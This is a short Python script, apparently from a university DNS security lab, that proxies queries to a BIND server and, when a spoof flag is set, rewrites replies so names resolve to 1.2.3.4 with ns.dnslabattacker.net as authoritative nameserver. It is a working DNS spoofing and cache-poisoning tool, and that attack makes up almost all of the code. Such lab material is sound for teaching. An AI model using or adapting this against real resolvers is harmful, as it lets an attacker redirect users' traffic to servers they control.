#!/usr/bin/env python
import argparse
import socket
from scapy.all import *
import sys
import subprocess
import shlex

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

UDP_IP = "127.0.0.1"
BIND_IP = "128.100.8.219"
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.bind((UDP_IP, port))
while True:
    data, addr = sock.recvfrom(1024)
    packet = DNS(data)
    print "received message:", packet.summary()
    print "from address: ",addr
    if "DNS Qry" in packet.summary():
        print "forwarding to BIND..."
        addr_ip = addr[0]
        addr_port = addr[1]
        sock.sendto(data, (BIND_IP,dns_port))
    else:
        #print "send back:", packet.show()
        if SPOOF:
            print "spoofing data"
            print packet[scapy.all.DNS].nscount
            if packet.haslayer(scapy.all.DNSRR):
                qname = packet[scapy.all.DNSQR].qname
                an_ttl = packet[scapy.all.DNSRR].ttl
                ns_ttl = packet['DNS'].ns.ttl
                dns_response = scapy.all.DNSRR(rrname=qname,rdata="1.2.3.4",ttl=an_ttl)
                packet.an = dns_response
                ns_response = scapy.all.DNSRR(rrname=qname,type="NS",rdata="ns.dnslabattacker.net",ttl=ns_ttl)/DNSRR(rrname=qname,type="NS",rdata="ns.dnslabattacker.net",ttl=ns_ttl)
                packet.ns = ns_response

                ip = packet.getlayer(IP)
                dns = packet.getlayer(DNS)
                pkt = DNS(id=dns.id,qd=dns.qd,nscount=2,an=DNSRR(rrname=dns.qd.qname, type='A', ttl=10,rdata='1.2.3.4'),ns=DNSRR(rrname=dns.qd.qname, type = 'NS', ttl=100,rdata="ns.dnslabattacker.net")/DNSRR(rrname=dns.qd.qname,type='NS',ttl=100,rdata="ns.dnslabattacker.net"))
                #packet.show()
                sock.sendto(bytes(packet), (addr_ip,addr_port))


        else:
            print "not spoofing data"
            sock.sendto(data, (addr_ip,addr_port))



